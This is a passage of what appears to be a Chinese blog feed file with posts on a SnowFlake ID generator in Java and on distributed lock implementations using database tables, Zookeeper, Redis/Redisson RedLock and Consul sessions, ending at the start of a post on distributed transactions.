class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> MACHINE_BIT = <span class="number">5</span>; <span class="comment">// 机器标识占用的位数</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> DATACENTER_BIT = <span class="number">5</span>;<span class="comment">// 数据中心占用的位数</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 每一部分的最大值</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> MAX_DATACENTER_NUM = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; DATACENTER_BIT);</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> MAX_MACHINE_NUM = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; MACHINE_BIT);</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> MAX_SEQUENCE = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; SEQUENCE_BIT);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 每一部分向左的位移</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> MACHINE_LEFT = SEQUENCE_BIT;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> DATACENTER_LEFT = SEQUENCE_BIT + MACHINE_BIT;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> TIMESTMP_LEFT = DATACENTER_LEFT + DATACENTER_BIT;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">long</span> datacenterId; <span class="comment">// 数据中心</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">long</span> machineId; <span class="comment">// 机器标识</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">long</span> sequence = <span class="number">0L</span>; <span class="comment">// 序列号</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">long</span> lastStmp = -<span class="number">1L</span>;<span class="comment">// 上一次时间戳</span></span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">SnowFlake</span><span class="params">(<span class="keyword">long</span> datacenterId, <span class="keyword">long</span> machineId)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (datacenterId &gt; MAX_DATACENTER_NUM || datacenterId &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"datacenterId can't be greater than MAX_DATACENTER_NUM or less than 0"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (machineId &gt; MAX_MACHINE_NUM || machineId &lt; <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"machineId can't be greater than MAX_MACHINE_NUM or less than 0"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">this</span>.datacenterId = datacenterId;</span><br><span class="line">		<span class="keyword">this</span>.machineId = machineId;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * 产生下一个ID</span></span><br><span class="line"><span class="comment">	 *</span></span><br><span class="line"><span class="comment">	 * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">long</span> <span class="title">nextId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">long</span> currStmp = getNewstmp();</span><br><span class="line">		<span class="keyword">if</span> (currStmp &lt; lastStmp) &#123;</span><br><span class="line">			<span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"Clock moved backwards.  Refusing to generate id"</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (currStmp == lastStmp) &#123;</span><br><span class="line">			<span class="comment">// 相同毫秒内，序列号自增</span></span><br><span class="line">			sequence = (sequence + <span class="number">1</span>) &amp; MAX_SEQUENCE;</span><br><span class="line">			<span class="comment">// 同一毫秒的序列数已经达到最大</span></span><br><span class="line">			<span class="keyword">if</span> (sequence == <span class="number">0L</span>) &#123;</span><br><span class="line">				currStmp = getNextMill();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="comment">// 不同毫秒内，序列号置为0</span></span><br><span class="line">			sequence = <span class="number">0L</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		lastStmp = currStmp;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> (currStmp - START_STMP) &lt;&lt; TIMESTMP_LEFT <span class="comment">// 时间戳部分</span></span><br><span class="line">				| datacenterId &lt;&lt; DATACENTER_LEFT <span class="comment">// 数据中心部分</span></span><br><span class="line">				| machineId &lt;&lt; MACHINE_LEFT <span class="comment">// 机器标识部分</span></span><br><span class="line">				| sequence; <span class="comment">// 序列号部分</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">long</span> <span class="title">getNextMill</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">long</span> mill = getNewstmp();</span><br><span class="line">		<span class="keyword">while</span> (mill &lt;= lastStmp) &#123;</span><br><span class="line">			mill = getNewstmp();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> mill;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">long</span> <span class="title">getNewstmp</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> System.currentTimeMillis();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		SnowFlake snowFlake = <span class="keyword">new</span> SnowFlake(<span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; (<span class="number">1</span> &lt;&lt; <span class="number">12</span>); i++) &#123;</span><br><span class="line">			System.out.println(snowFlake.nextId());</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>分布式ID</tag>
        <tag>SnowFlake</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式锁的几种实现方式</title>
    <url>/2020/04/12/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E7%9A%84%E5%87%A0%E7%A7%8D%E5%AE%9E%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="分布式锁的几种实现方式"><a href="#分布式锁的几种实现方式" class="headerlink" title="分布式锁的几种实现方式"></a>分布式锁的几种实现方式</h1><h2 id="为什么需要分布式锁"><a href="#为什么需要分布式锁" class="headerlink" title="为什么需要分布式锁"></a>为什么需要分布式锁</h2><p>在许多场景中，有些操作是只能被执行一次的，比如，用户消费之后的通知短信，发送多了，会招致投诉。在单机场景下，可以使用并发API或者锁解决，但是在分布式场景中，就没有那么简单了。</p>
<p>分布式场景是多进程场景，相同服务的不同实例可能都不知道对方的存在，这个时候要确保只有一个实例执行了某个操作，方法之一就是使用分布式锁。</p>
<h2 id="分布式锁的特性"><a href="#分布式锁的特性" class="headerlink" title="分布式锁的特性"></a>分布式锁的特性</h2><p>根据分布式场景的特性，分布式锁需要具备以下一些特性：</p>
<ul>
<li>互斥性:和我们本地锁一样互斥性是最基本，但是分布式锁需要保证在不同节点的不同线程的互斥。</li>
<li>可重入性:同一个节点上的同一个线程如果获取了锁之后那么也可以再次获取这个锁。</li>
<li>锁超时:和本地锁一样支持锁超时，防止死锁。</li>
<li>高效，高可用:加锁和解锁需要高效，同时也需要保证高可用防止分布式锁失效，可以增加降级。</li>
<li>支持阻塞和非阻塞:和ReentrantLock一样支持lock和trylock以及tryLock(long timeOut)。</li>
<li>支持公平锁和非公平锁(可选):公平锁的意思是按照请求加锁的顺序获得锁，非公平锁就相反是无序的。这个一般来说实现的比较少。</li>
</ul>
<h2 id="常见的分布式锁"><a href="#常见的分布式锁" class="headerlink" title="常见的分布式锁"></a>常见的分布式锁</h2><p>下面我们看看常用的实现分布式锁的方法</p>
<h3 id="数据库实现分布式锁"><a href="#数据库实现分布式锁" class="headerlink" title="数据库实现分布式锁"></a>数据库实现分布式锁</h3><h4 id="使用数据库表做分布式锁"><a href="#使用数据库表做分布式锁" class="headerlink" title="使用数据库表做分布式锁"></a>使用数据库表做分布式锁</h4><p>要通过数据库实现分布式锁，最简单的就是给数据库里面插入一张锁表。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`lock`</span> (</span><br><span class="line">	<span class="string">`id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">unsigned</span> <span class="keyword">not</span> <span class="literal">null</span> AUTO_INCREMENT,</span><br><span class="line">    <span class="string">`resource_name`</span> <span class="built_in">varchar</span>(<span class="number">128</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">default</span> <span class="string">''</span>,</span><br><span class="line">    <span class="string">`node_info`</span> <span class="built_in">varchar</span>(<span class="number">128</span>) <span class="keyword">default</span> null.</span><br><span class="line">    <span class="string">`count`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">not</span> <span class="literal">null</span> <span class="keyword">default</span> <span class="number">0</span>,</span><br><span class="line">    <span class="string">`desc`</span> <span class="built_in">varchar</span>(<span class="number">128</span>) <span class="keyword">default</span> <span class="literal">null</span>,</span><br><span class="line">    <span class="string">`update_time`</span> <span class="built_in">timestamp</span> <span class="literal">null</span> <span class="keyword">default</span> <span class="literal">null</span>,</span><br><span class="line">    <span class="string">`create_time`</span> <span class="built_in">timestamp</span> <span class="literal">null</span> <span class="keyword">default</span> <span class="literal">null</span></span><br><span class="line">    PRIMARY <span class="keyword">KEY</span>(<span class="string">`id`</span>),</span><br><span class="line">    <span class="keyword">UNIQUE</span> <span class="keyword">KEY</span> <span class="string">`unique_resource`</span> (<span class="string">`resource_name`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br></pre></td></tr></table></figure>

<p>当我们向锁住某个资源的时候，就插入一条记录，以资源名称和插入线程的名称（NodeInfo）为值。因为对resource_name做了唯一性约束，第二个请求达到数据库的时候先判断是否存在resource_name的记录，并且记录的node_info是不是当前线程的，是的话，就增加计数count，否则拒绝。</p>
<p><img src="https://huhansi.github.io/images/2020-04-12-fenbushilock.png" alt="Lock示例"></p>
<p>释放锁的时候，删除记录就行了</p>
<h5 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h5><p>数据库锁存在以下几个问题：</p>
<ol>
<li>强烈依赖数据库的可用性，一旦单点数据库宕机，业务就会不可用</li>
<li>锁没有失效时间，一旦解锁失败就会导致锁记录一直存在，其他线程无法再次获得锁</li>
<li>锁只能是非阻塞的，insert失败就会马上失败，没有等待队列一说</li>
<li>非公平锁</li>
</ol>
<h4 id="基于数据库排他锁做分布式锁"><a href="#基于数据库排他锁做分布式锁" class="headerlink" title="基于数据库排他锁做分布式锁"></a>基于数据库排他锁做分布式锁</h4><p>在查询语句后面增加for update，数据库会在查询过程中给数据库表增加排他锁。</p>
<p>如果执行失败，就会一直阻塞，直至成功。使用排他锁可以解决阻塞和无法释放锁的问题。</p>
<p>锁定之后宕机，数据库会自己释放锁。</p>
<p>加锁操作可以做成如下这种：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">connection.setAutoCommit(false);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> xxx <span class="keyword">for</span> <span class="keyword">update</span>;</span><br></pre></td></tr></table></figure>

<p>解锁操作就可以是</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">connection.commit()</span><br></pre></td></tr></table></figure>

<p>但是，如果这个排他锁一直不提交，就会占用数据库连接，长久会撑爆数据库的连接池。</p>
<h3 id="Zookeeper实现分布式锁"><a href="#Zookeeper实现分布式锁" class="headerlink" title="Zookeeper实现分布式锁"></a>Zookeeper实现分布式锁</h3><p>基于Zookeeper实现分布式锁，需要具备相关的Zookeeper的信息。</p>
<ul>
<li>Zookeeper 一般由多个节点构成（单数），采用 zab 一致性协议。因此可以将 Zookeeper 看成一个单点结构，对其修改数据其内部自动将所有节点数据进行修改而后才提供查询服务。</li>
<li>Zookeeper的数据以目录树的形式，每个目录称为 znode， znode 中可存储数据（一般不超过 1M），还可以在其中增加子节点。</li>
<li>子节点有三种类型。序列化节点，每在该节点下增加一个节点自动给该节点的名称上自增。临时节点，一旦创建这个 znode 的客户端与服务器失去联系，这个 znode 也将自动删除。最后就是普通节点。</li>
<li>Watch 机制，client 可以监控每个节点的变化，当产生变化会给 client 产生一个事件。</li>
</ul>
<h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>上锁，改为创建临时有序节点，每个上锁的动作都能创建成功，只是他们的序号不同。只有序号最小的节点才可以用有锁，如果这个节点不是最小的序号，那么就watch序号比它小1号的前一个节点。因此，基于这个原理的锁，是一个公平锁。</p>
<h4 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h4><ol>
<li>新建一个/lock目录</li>
<li>每当需要竞争获取锁的时候，在/lock目录下创建一个有序的临时节点（EPHEMERAL_SEQUENTIAL）</li>
<li>判断节点序号是不是所有节点中最小的，是的话，获取锁成功。否则，watch序号比本身小1的前一个节点</li>
<li>watch事件到来后，再次判断是否是最小的序号，成功获取锁后，执行代码，最后释放资源，删除当前节点。</li>
</ol>
<h3 id="Redis实现分布式锁"><a href="#Redis实现分布式锁" class="headerlink" title="Redis实现分布式锁"></a>Redis实现分布式锁</h3><h4 id="简单实现"><a href="#简单实现" class="headerlink" title="简单实现"></a>简单实现</h4><p>借助setNx命令。</p>
<p>如果不存在则更新，其可以很好的用来实现我们的分布式锁。对于某个资源加锁我们只需要</p>
<blockquote>
<p>setNx resourceName value</p>
</blockquote>
<p>这里有个问题，加锁了之后如果机器宕机那么这个锁就不会得到释放所以会加入过期时间，加入过期时间需要和setNx同一个原子操作，在Redis2.8之前我们需要使用Lua脚本达到我们的目的，但是redis2.8之后redis支持nx和ex操作是同一原子操作。</p>
<blockquote>
<p>set resourceName value ex 5 nx</p>
</blockquote>
<h4 id="Redission"><a href="#Redission" class="headerlink" title="Redission"></a>Redission</h4><p>redisson是在redis基础上实现的一套开源解决方案，不仅提供了一系列的分布式的java常用对象，还提供了许多分布式服务，宗旨是促进使用者对redis的关注分离，更多的关注业务逻辑的处理上。</p>
<p>Redission实现了Java的Lock接口</p>
<p>简单的使用如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        Config config1 = <span class="keyword">new</span> Config();</span><br><span class="line">        config1.useSingleServer().setAddress(<span class="string">"redis://xxxx1:xxx1"</span>)</span><br><span class="line">                .setPassword(<span class="string">"xxxx1"</span>)</span><br><span class="line">                .setDatabase(<span class="number">0</span>);</span><br><span class="line">        RedissonClient redissonClient1 = Redisson.create(config1);</span><br><span class="line">        Config config2 = <span class="keyword">new</span> Config();</span><br><span class="line">        config2.useSingleServer()</span><br><span class="line">                .setAddress(<span class="string">"redis://xxxx2:xxx2"</span>)</span><br><span class="line">                .setPassword(<span class="string">"xxxx2"</span>)</span><br><span class="line">                .setDatabase(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        RedissonClient redissonClient2 = Redisson.create(config2);</span><br><span class="line"></span><br><span class="line">        Config config3 = <span class="keyword">new</span> Config();</span><br><span class="line">        config3.useSingleServer().</span><br><span class="line">                setAddress(<span class="string">"redis://xxxx3:xxx3"</span>)</span><br><span class="line">                .setPassword(<span class="string">"xxxx3"</span>)</span><br><span class="line">                .setDatabase(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        RedissonClient redissonClient3 = Redisson.create(config3);</span><br><span class="line"></span><br><span class="line">        String lockName = <span class="string">"redlock-test"</span>;</span><br><span class="line">        RLock lock1 = redissonClient1.getLock(lockName);</span><br><span class="line">        RLock lock2 = redissonClient2.getLock(lockName);</span><br><span class="line">        RLock lock3 = redissonClient3.getLock(lockName);</span><br><span class="line"></span><br><span class="line">        RedissonRedLock redLock = <span class="keyword">new</span> RedissonRedLock(lock1, lock2, lock3);</span><br><span class="line">        <span class="keyword">boolean</span> isLock;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            isLock = redLock.tryLock(<span class="number">500</span>, <span class="number">30000</span>, TimeUnit.MILLISECONDS);</span><br><span class="line">            System.out.println(<span class="string">"isLock = "</span> + isLock);</span><br><span class="line">            <span class="keyword">if</span> (isLock) &#123;</span><br><span class="line">                <span class="comment">// lock success, do something;</span></span><br><span class="line">                Thread.sleep(<span class="number">30000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 无论如何, 最后都要解锁</span></span><br><span class="line">            redLock.unlock();</span><br><span class="line">            System.out.println(<span class="string">"unlock success"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://huhansi.github.io/images/2020-04-12-redission1.png" alt="Redission加锁过程"></p>
<p><img src="https://huhansi.github.io/images/2020-04-12-redission2.png" alt="Redission解锁过程"></p>
<h4 id="RedLock"><a href="#RedLock" class="headerlink" title="RedLock"></a>RedLock</h4><p>RedLock是基于redis实现的分布式锁，它能够保证以下特性：</p>
<ol>
<li>互斥性：在任何时候，只能有一个客户端能够持有锁；</li>
<li>避免死锁：当客户端拿到锁后，即使发生了网络分区或者客户端宕机，也不会发生死锁；（利用key的存活时间）</li>
<li>容错性：只要多数节点的redis实例正常运行，就能够对外提供服务，加锁或者释放锁；</li>
</ol>
<h5 id="RedLock算法"><a href="#RedLock算法" class="headerlink" title="RedLock算法"></a>RedLock算法</h5><p>假设有N个redis的master节点，这些节点是相互独立的（不需要主从或者其他协调的系统）。<strong>N推荐为奇数</strong></p>
<p>客户端在获取锁时，需要做以下操作：</p>
<ul>
<li>获取当前时间戳，以微秒为单位</li>
<li>使用相同的lockName和lockValue，尝试从N个节点获取锁。</li>
<li>在获取锁时，要求等待获取锁的时间远小于锁的释放时间，如锁的lease_time为10s，那么wait_time应该为5-50毫秒；避免因为redis实例挂掉，客户端需要等待更长的时间才能返回，即需要让客户端能够fast_fail；如果一个redis实例不可用，那么需要继续从下个redis实例获取锁</li>
<li>当从N个节点获取锁结束后，如果客户端能够从多数节点(N/2 + 1)中成功获取锁，且获取锁的时间小于失效时间，那么可认为，客户端成功获得了锁。（获取锁的时间=当前时间戳 - 步骤1的时间戳）</li>
<li>客户端成功获得锁后，那么锁的实际有效时间 = 设置锁的有效时间 - 获取锁的时间。</li>
<li>客户端获取锁失败后，N个节点的redis实例都会释放锁，即使未能加锁成功。</li>
<li>当客户端无法获取到锁时，应该随机延时后进行重试，防止多个客户端在同一时间抢夺同一资源的锁（会导致脑裂，最终都不能获取到锁）。客户端获得超过半数节点的锁花费的时间越短，那么脑裂的概率就越低。所以，理想的情况下，客户端最好能够同时（并发）向所有redis发出set命令。</li>
<li>当客户端从多数节点获取锁失败时，应该尽快释放已经成功获取的锁，这样其他客户端不需要等待锁过期后再获取。（如果存在网络分区，客户端已经无法和redis进行通信，那么此时只能等待锁过期后自动释放）</li>
<li>向所有redis实例发送释放锁命令即可，不需要关心redis实例有没有成功上锁。</li>
</ul>
<h3 id="基于Consul实现的分布式锁"><a href="#基于Consul实现的分布式锁" class="headerlink" title="基于Consul实现的分布式锁"></a>基于Consul实现的分布式锁</h3><h4 id="基于K-V"><a href="#基于K-V" class="headerlink" title="基于K/V"></a>基于K/V</h4><p>Consul的KV支持acquire和release操作。<code>acquire/release</code>操作实现了一种类似 <a href="https://en.wikipedia.org/wiki/Compare-and-swap" target="_blank" rel="noopener">Check-And-Set</a>操作，这两个操作使用 Consul Session 进行操作：</p>
<ul>
<li><code>acquire</code>操作只有当 Key 的锁不存在持有者（Session）时才会返回 true，同时执行操作的 Session 会持有对该 Key 的锁；否则就返回false；</li>
<li><code>release</code>操作则是使用指定的 Session 来释放某个Key的锁，如果指定的 Session无效，那么会返回 false，否则就会set设置Value值，并返回 true。</li>
</ul>
<p>由于同一时间只有一个 Session 可以占有一个 Key 的锁，因此可以将一个 Key 当做一把锁，在访问临界资源时调用<code>acquire</code>操作实现 Lock 操作；在访问结束后调用<code>release</code>操作实现 Unlock 操作。</p>
<p><img src="https://huhansi.github.io/images/2020-04-14-consul2.png" alt="基于KV和Session的分布式锁"></p>
<p>需要注意的是，上面的这个锁，如果一直没有释放的话，就永远释放不了了。因此，在创建session的时候需要给这个session加一个ttl，时间到了就自动释放锁。</p>
<h5 id="样例代码"><a href="#样例代码" class="headerlink" title="样例代码"></a>样例代码</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Lock</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> String prefix = <span class="string">"lock/"</span>;  <span class="comment">// 同步锁参数前缀</span></span><br><span class="line">    <span class="keyword">private</span> ConsulClient consulClient;</span><br><span class="line">    <span class="keyword">private</span> String sessionName;</span><br><span class="line">    <span class="keyword">private</span> String sessionId = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String lockKey;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> consulClient</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sessionName   同步锁的session名称</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> lockKey       同步锁在consul的KV存储中的Key路径，会自动增加prefix前缀，方便归类查询</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Lock</span><span class="params">(ConsulClient consulClient, String sessionName, String lockKey)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.consulClient = consulClient;</span><br><span class="line">        <span class="keyword">this</span>.sessionName = sessionName;</span><br><span class="line">        <span class="keyword">this</span>.lockKey = prefix + lockKey;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取同步锁</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> block     是否阻塞，直到获取到锁为止</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">lock</span><span class="params">(<span class="keyword">boolean</span> block)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (sessionId != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(sessionId + <span class="string">" - Already locked!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sessionId = createSession(sessionName);</span><br><span class="line">        <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">            PutParams putParams = <span class="keyword">new</span> PutParams();</span><br><span class="line">            putParams.setAcquireSession(sessionId);</span><br><span class="line">            <span class="keyword">if</span>(consulClient.setKVValue(lockKey, <span class="string">"lock:"</span> + LocalDateTime.now(), putParams).getValue()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(block) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 释放同步锁</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Boolean <span class="title">unlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        PutParams putParams = <span class="keyword">new</span> PutParams();</span><br><span class="line">        putParams.setReleaseSession(sessionId);</span><br><span class="line">        <span class="keyword">boolean</span> result = consulClient.setKVValue(lockKey, <span class="string">"unlock:"</span> + LocalDateTime.now(), putParams).getValue();</span><br><span class="line">        consulClient.sessionDestroy(sessionId, <span class="keyword">null</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 创建session</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> sessionName</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">createSession</span><span class="params">(String sessionName)</span> </span>&#123;</span><br><span class="line">        NewSession newSession = <span class="keyword">new</span> NewSession();</span><br><span class="line">        newSession.setName(sessionName);</span><br><span class="line">        <span class="keyword">return</span> consulClient.sessionCreate(newSession, <span class="keyword">null</span>).getValue();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="基于Consul的分布式信号量"><a href="#基于Consul的分布式信号量" class="headerlink" title="基于Consul的分布式信号量"></a>基于Consul的分布式信号量</h4><p>上一个小章节中，利用Consul做了分布式锁，基于Consul的KV，但是只用到了K，没有用到V。如果把V也用上的话，我们就可以实现一个分布式信号量。</p>
<p>当然，也是借助acquire和release操作</p>
<ul>
<li><p>信号量存储：semaphore/key</p>
</li>
<li><p>acquired操作：</p>
<ul>
<li><p>创建session</p>
</li>
<li><p>锁定key竞争者：semaphore/key/session</p>
</li>
<li><p>查询信号量：semaphore/key/.lock，可以获得如下内容（如果是第一次创建信号量，将获取不到，这个时候就直接创建）</p>
</li>
<li><p>如果持有者已达上限，返回false，如果阻塞模式，就继续尝试acquired操作</p>
</li>
<li><p>如果持有者未达上限，更新semaphore/key/.lock的内容，将当前线程的sessionId加入到holders中。注意：更新的时候需要设置cas，它的值是“查询信号量”步骤获得的“ModifyIndex”值，该值用于保证更新操作的基础没有被其他竞争者更新。如果更新成功，就开始执行具体逻辑。如果没有更新成功，说明有其他竞争者抢占了资源，返回false，阻塞模式下继续尝试acquired操作</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"limit"</span>: <span class="number">3</span>,</span><br><span class="line">    <span class="attr">"holders"</span>: [</span><br><span class="line">        <span class="string">"90c0772a-4bd3-3a3c-8215-3b8937e36027"</span>,</span><br><span class="line">        <span class="string">"93e5611d-5365-a374-8190-f80c4a7280ab"</span></span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>release操作：</p>
<ul>
<li>从semaphore/key/.lock的holders中移除当前sessionId</li>
<li>删除semaphore/key/session</li>
<li>删除当前的session</li>
</ul>
</li>
</ul>
<p><img src="https://huhansi.github.io/images/2020-04-14-consul3.png" alt="基于KV和Session的分布式信号量"></p>
<p>实际应用的时候，必须加入TTL的session清理以及对.lock资源中的无效holder进行清理的机制。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://zhuanlan.zhihu.com/p/94704241" target="_blank" rel="noopener">分布式锁的几种实现方式</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/42056183" target="_blank" rel="noopener">分布式锁看这篇就够了</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1034053" target="_blank" rel="noopener">基于Consul的分布式锁实现</a></p>
<p><a href="https://www.consul.io/docs/guides/semaphore.html" target="_blank" rel="noopener">Distributed Semaphores with Sessions</a></p>
]]></content>
      <categories>
        <category>分布式</category>
      </categories>
      <tags>
        <tag>Zookeeper</tag>
        <tag>Redis</tag>
        <tag>分布式锁</tag>
        <tag>RedLock</tag>
        <tag>Redission</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式事务入门</title>
    <url>/2020/04/12/%E5%88%86%E5%B8%83%E5%BC%8F/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1%E5%85%A5%E9%97%A8/</url>
